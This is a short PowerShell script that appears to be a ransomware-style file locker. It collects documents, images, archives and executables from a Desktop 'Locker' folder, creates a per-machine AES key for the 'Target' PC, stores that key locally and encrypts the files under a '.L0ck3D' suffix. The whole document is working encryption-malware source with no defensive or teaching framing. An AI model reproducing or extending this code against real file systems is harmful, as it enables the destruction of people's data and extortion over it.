
$scriptpath = $MyInvocation.MyCommand.Path
$dir = Split-Path $scriptpath
$desktop = [Environment]::GetFolderPath("Desktop")
$templockdir = "$desktop\Locker"
$unlockedfiles = Get-ChildItem -Path "$templockdir" -Include "*.exe", "*.dll", "*.txt", "*.zip", "*.7z", "*.doc", "*.docx", "*.wpd", "*.gz", "*.lnk", "*.xlsm", "*.xlsx", "*.csv", "*.ppt", "*.pptx", "*.jpg", "*.jpeg", "*.png", "*.bmp", "*.gif", "*.mp3", "*.wav", "*.midi", "*.pdf"  -Recurse
$pcname = $env:computername
$lockerkeys = "$dir\lockerkeys"


Get-Content -Path "$dir\version"

#Import AES Encryption/Decryption/Key source to Script.
Import-Module $dir\encrypt.psm1 3>$null


# Create Key Folder if None exists.
if(!(Test-Path -Path $lockerkeys )){
   New-Item -ItemType directory -Path $lockerkeys 3>$null
Write-Host "Keys Folder was not found, Creating it now.."
}

# Check if Key for Target is already created, if so use that key.
if(Test-Path $lockerkeys\"$pcname".key){
Write-Host "KEY FOUND!! Already a key for this PC, using that AES Key."
write-host "`n"
$key = Get-Content -Path $lockerkeys\"$pcname".key 3>$null
}

# Create Unique AES Key for the Target Machine and write it to Keys Folder
if(!(Test-Path $lockerkeys\"$pcname".key)){
$key = Create-AESKey
Write-Host "Creating Unique Key for this Machine.."
echo $key >$lockerkeys\"$pcname".key
}

# Encrypt Files
Write-Host "Encrypting Files... Please Wait.."
write-host "`n"
Write-Host "DO NOT TURN EXIT PROGRAM OR RISK LOSSING DATA WHILE ENCRYPTING!!"
write-host "`n"
Encrypt-File $unlockedfiles -Key $key -Suffix '.L0ck3D'

exit